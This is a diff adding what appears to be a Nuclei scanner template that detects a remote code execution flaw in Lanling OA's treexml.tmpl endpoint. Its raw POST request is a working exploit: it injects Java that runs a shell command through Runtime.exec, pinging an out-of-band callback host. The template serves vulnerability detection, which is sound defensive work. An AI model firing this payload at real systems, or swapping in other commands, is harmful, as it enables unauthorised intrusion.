@@ -1,0 +1,38 @@
+id: lanling-oa-rce
+info:
+  name: Lanling OA treexml.tmpl Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Lanling OA office system has a remote code execution vulnerability in the `treexml.tmpl` endpoint. Successful exploitation can lead to arbitrary code execution.
+  tags: rce, critical
+  reference:
+    - http://www.landray.com.cn/
+http:
+  - raw:
+      - |
+        POST /data/sys-common/treexml.tmpl HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        s_bean=ruleFormulaValidate&script=try {
+        Process child = Runtime.getRuntime().exec("ping -c 1 {{interactsh-url}}");
+        InputStream in = child.getInputStream();
+        int c;
+        while ((c = in.read()) != -1) {
+        out.print((char)c);
+        }
+        in.close();
+        try {
+        child.waitFor();
+        } catch (InterruptedException e) {
+        e.printStackTrace();
+        }
+        } catch (IOException e) {
+        System.err.println(e);
+        }
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
